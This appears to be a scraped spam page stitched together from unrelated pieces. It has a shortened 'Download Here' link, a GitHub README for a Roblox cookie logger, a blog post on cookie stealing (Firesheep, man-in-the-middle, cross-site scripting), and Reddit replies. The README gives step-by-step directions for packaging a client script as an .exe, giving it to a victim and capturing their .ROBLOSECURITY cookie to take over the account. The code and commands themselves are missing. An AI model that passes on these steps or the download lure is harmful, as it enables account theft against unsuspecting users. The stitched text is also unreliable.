@@ -1,0 +1,246 @@
+Download Here ---> https://tinyurl.com/ycx3x5fn
+
+
+
+lnfernal/roblox-cookie-logger-2
+
+
+This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
+
+
+Name already in use
+
+
+A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
+
+
+Sign In Required
+
+
+Please sign in to use Codespaces.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching Xcode
+
+
+If nothing happens, download Xcode and try again.
+
+
+Launching Visual Studio Code
+
+
+Your codespace will open once ready.
+
+
+There was a problem preparing your codespace, please try again.
+
+
+Latest commit
+
+
+Git stats
+
+
+Files
+
+
+Failed to load latest commit information.
+
+
+README.md 
+
+
+Use someone else's Roblox account by getting roblox cookies between server and client using python sockets
+
+
+What is roblox cookie?
+
+
+roblox cookie makes you log in other's accounts
+
+
+How can I log into someone else's account with a cookie?
+
+
+at roblox.com, you should change cookie value of .ROBLOSECURITY
+
+
+you can change cookie using cookie editor plugin
+
+
+First of all, you should update Server and client ip
+
+
+In the Client.py && Server.py files, change the 'YOUR IP HERE' to your IP address.
+
+
+How to get my ip?
+
+
+There are many resources on the internet on how to get your IP, please refer to them.
+
+
+To get a Roblox cookie, you have to wait for the target to send the Roblox cookie.
+
+
+To turn on the server, just run Server.py with python3.x
+
+
+Get cookie from target
+
+
+After starting the server, now we need to give the target a file from which to get the roblox cookies.
+ 
+The target may not have Python installed, so you need to convert it to an .exe file.
+ 
+You can use pyinstaller to convert it to an .exe file. pyinstaller can be installed with:
+
+
+Next, you need to run the following command to change the Client.py file:
+
+
+Then, you can get .exe file of Client.py from dist/ folder
+
+
+Then give it to the target and wait for it to run while the server is running
+
+
+How to Steal Cookies the Easy Way
+
+
+Cookies still remain one of the largest areas of computing that the average user just doesn’t understand, and there are a myriad of different ways that a hacker can take advantage of cookies to steal a user’s personal information. Cookie stealing, which is synonymous with session hijacking, allows an attacker to log into a website that is protected with a user’s username and password by stealing session data in real-time. But before we delve into the different ways of stealing cookies, we first need to understand what a session is and how cookies work.
+
+
+“Session” is a term in computing – more specifically, networking – that gets thrown around a lot, but it can seem like jargon to the aspiring hacker. Most concepts in computer networking are in some way related to the OSI model, which is comprised of seven different layers that map different stages and processes of data exchange between two remote computing systems. More importantly, the fifth layer is called the Session layer, and this is where the term “session” gets it’s name.
+
+
+Within the Session layer of the OSI model, you’ll find common protocols such as SOCKS (a common type of proxy server connection), PPTP (Point to Point Tunneling Protocol), RTP (Real-time Transport Protocol), and others that aren’t as well known. However, when someone talks about session hijacking, they’re most often referring to a session between a client computer and a web server. In this context, “session” basically means a semi-constant exchange of information between two hosts. In contrast, consider constant exchanges through other protocols such as VPN tunnels, whereby the connection is permanent (barring technical difficulties, of course).
+
+
+In a session, two computers exchange information and authentication credentials to lay the groundwork for future communications. Take Facebook, for example. After you have logged into the Facebook service, you can browse through your feed, chat with friends, and play games until you intentionally choose to log out. If a session hadn’t been built between your computer and the Facebook servers, you would need to continually login again and again every time you wanted a new piece of data. Fortunately, you don’t have to, because all of your connection information is stored within a cookie.
+
+
+Cookies are small repositories of data that are stored within your web browser by a web server. They are rife with security concerns, and some of them can even track your online activity. Whenever you visit a web site, the cookie stored in your browser serves as a type of ID card. Each additional time you login or request resources from the same web server, the cookie saved in your browser sends its stored data to the web server. This allows web site administrators, and even Internet marketers, to see which of their pages are getting the most hits, how long users stay on each page, which links they click on, and a wealth of other information.
+
+
+And believe it or not, cookies are extremely prevalent these days. Have you ever purchased something from Amazon.com? If so, then you’ve used cookies before, whether you knew it or not. It’s quite common for online ecommerce sites to use cookies to record and store personal information you’ve entered, which products you’ve searched for, which items are in your online shopping cart, and other information so it doesn’t need to be tediously reentered each time you want to make a purchase.
+
+
+Furthermore, cookies are used to make a website more personal. Many sites offer preference options to let you customize the look, feel, and experience of any given web service. Once you revisit the site or resource, you’ll find that all your preferences were preserved. Though cookies make browsing the web a lot more convenient, they do have a lot of security drawbacks, as we’ll discuss next.
+
+
+Types of Cookies and Security Problems
+
+
+In theory, the only other online entity that can read cookies stored in your browser is the website that stored it there originally. However, it’s surprisingly easy for scripts to mine data from cookies, and there are some exceptionally dangerous types of cookies that are rife with security threats. Mainly, the types of cookies that are the most fearsome are named Flash cookies, zombie cookies, and super cookies.
+
+
+Even though your browser has ways to manage cookies, some are nearly impossible to delete. The problem is that special types of cookies aren’t stored within your browser, so even if you opt for a different web browser (Firefox, Chrome, etc.), the cookie will still be active. And many of these types of cookies are much larger than the average 4KB HTTP cookies – some of them ranging to 100KB or even 1MB. If you attempt to delete the cookie but notice that it keeps coming back every time you restart your browser, you’ve discovered a zombie cookie and may need special security software to remove it.
+
+
+Viewing Your Cookies and Managing Them
+
+
+You might now be wondering just how many cookies you have stored in your browser, and what you can do to pro-actively manage them and avoid the disaster of having an attacker hijack your session. Just about every browser has useful extensions that allow users to manage, backup, delete, secure, and view their cookies. All it takes is a simple search through your browser’s add-ons menu, though for Firefox users, I highly recommend the View Cookies add-on.
+
+
+Though you can navigate through the file system and see the cookies individually (which stored in different places by different browsers), I think the add-ons are the best way to go. Furthermore, just about every browser has code that allows users to completely disable cookies or set limitations, such as disallowing any cookies that are greater than X number of kilobytes or megabytes in size. Lastly, many browsers even have a setting that specifically disables flash cookies.
+
+
+The Easiest Way to Steal Cookies
+
+
+There are a number of ways that someone can steal another user’s cookies. From cross site scripting attacks to viruses embedded in seemingly harmless software, modern hackers have a lot of tools in their tool belt to hijack an unsuspecting user’s session. Many of these advanced attacks require a lot of background knowledge and expertise in networking protocols, software development, and web technologies to carry out the attack.
+
+
+Unfortunately for average users, there is one place way that is easier to steal cookies than any other attack method, and that’s by using simple tools over a local LAN. But getting access to a local LAN isn’t as challenging as it may seem. You can view any of our other posts on just how easy it is to crack wireless encryption protocols, but try to imagine where the easiest place is for hackers to connect with other users over a local LAN. Can you guess where it is?
+
+
+That’s right, on public Wi-Fi networks such as those found at airports and your local Internet café – heck, even a Starbucks. You don’t even need any fancy command line tools or advanced packet sniffing knowledge to steal cookies. Nope, all you need is a Firefox extension called Firesheep. Though it isn’t currently supported on Linux, it is available on Mac OS X and Windows (XP and later versions, dependent on the Winpcap package).
+
+
+Firesheep is a simple to use Firefox extension that leverages underlying packet sniffing technology to detect and copy cookies that are sent in an unencrypted format. If the cookie is sent across the network in an encrypted format, there’s not much this tool can do, however. But Firesheep makes it ludicrously simple to hijack a user’s session. As the extension sniffs out cookies, it populates a list of them on the sidebar of your browser in real-time. Once an unencrypted cookie has been discovered, the user (it’s so simple I doubt it’s fair to use the term hacker) simply needs to double-click on the cookie and they’ll automatically hijack the session and log in as the unsuspecting user.
+
+
+Given that Mozilla is a legitimate and trustworthy organization, it’s a little odd that they wouldn’t blacklist the extension. However, Mozilla had stated that they only use their blacklist to mark code and add-ons that contain spyware and other such security threats. Since this tool doesn’t harm the user’s browser, it seems that it’s still available. But even if they did disable, attackers would still be able to use the tool since Firefox contains a feature that effectively disables the blacklist.
+
+
+Packet Sniffer’s and Man-in-the-Middle Attacks
+
+
+Firesheep is essentially a packet sniffing add-on that is ridiculously user-friendly. However, advanced users can take advantage of other packets sniffers, such as Wireshark, to steal cookies. However, this method is a lot harder an takes some preexisting knowledge of how to work in Firefox. We won’t detail the process of starting a Wireshark packet capture here, but we do want you to understand how they work.
+
+
+Man-in-the-Middle attacks and DNS based attacks are very common, and they both work to redirect a user’s traffic to a computer system that the hacker controls – such as their personal computer, a server, or a networking device (router, firewall, proxy server, etc.). Once the hacker has hoodwinked the end user’s computer and/or the default gateway into sending their data to the hacker’s networking interface, the attacker can see everything that isn’t encrypted. Naturally, this includes cookies, so all a hacker would have to do is run a capture, analyze collected traffic, and pluck the cookie data out of their results before the user disconnects or logs out.
+
+
+Cross-Site Scripting (XSS)
+
+
+Last but not least, cross-site scripting is another popular way to steal cookies from a user. If you remember, most often only the website that stored a cookie can access it, but this isn’t always the case. Cross-site scripting works by embedding PHP (among other types) of scripts into web pages, web pages that may or may not be owned by the hacker (though often they are not).
+
+
+
+
+
+Though security controls are always increasing, there are still a vast amount of websites vulnerable to XSS attacks. It can even be a simple website like a forum. For example, consider a forum that allows image tags. They code post a link in the image tag with code such as the following: 
+
+
+Other times, they may simply link to a web resource that contains their script. Once the script executes in the users web browser, the attacker’s code will execute and send copies of any active cookies to another location, such as their web browser or another resource.
+
+
+Remember that the idea here is to learn how to protect yourself, and others, from becoming the victim of a cookie stealing attack. Though it would be simple to run Firesheep, I’d highly advise against doing anything illegal. Also remember to respect other user’s privacy.
+
+
+How to cookie log someone?
+
+
+Anyone know how to cookie log someone? I'm just trying to troll my friend because I know you have to send them a link so how do you go about doing this?
+
+
+Yeaaaa im not telling you how to do malicious shit sorry mate but just search on Google and forums
+
+
+Dont send them a link to something you don’t 100% understand. You could look on github for a cookie logger, that way you could verify if it’s safe.
+
+
+Just look up How to steal people's ips and cookies
+
+
+A lot of use this javascript to do this thingy wothen u get all of ue cookies and passes stolen lol instead of u stealing them
+
+
+Cookie logging isn't a "troll" and it is used for malicious purposes. Since it is used for malicious purposes and you are hijacking accounts, I bet your friend wouldn't be laughing after you gain unauthorized entry to his accounts.
+
+
+Most accounts has a security thingy if you inspect or press F12 for console, but you shouldn't do this.
+
+
+How do ROBLOX cookie loggers get your password?
+
+
+I heard that they do something inside the settings page and inspect and type inside the console "(AbortController)//Open/Password:True (Pass Hidden() = False" but it does not work?
+
+
+Just go inspect element and then bla bla bla. I forgot lol
+
+
+About Community
+
+
+A subreddit for ROBLOX exploiting, whether it's questions or downloads, We've got it all! Come join our group of expert lego haxers! Join our Discord for giveaways and more: https://discord.gg/z2ENgbG5mG
+
+
+Reddit and its partners use cookies and similar technologies to provide you with a better experience. By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising. By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform. For more information, please see our Cookie Notice and our Privacy Policy .
